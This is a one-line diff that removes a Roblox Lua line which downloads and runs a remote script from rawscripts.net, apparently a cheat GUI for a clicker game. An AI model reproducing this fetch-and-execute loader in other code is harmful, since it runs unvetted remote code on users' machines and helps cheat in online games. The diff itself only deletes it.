@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://rawscripts.net/raw/EGG-HUNT!-Rebirth-Champions-X-Clicker-GUI-10323"))()
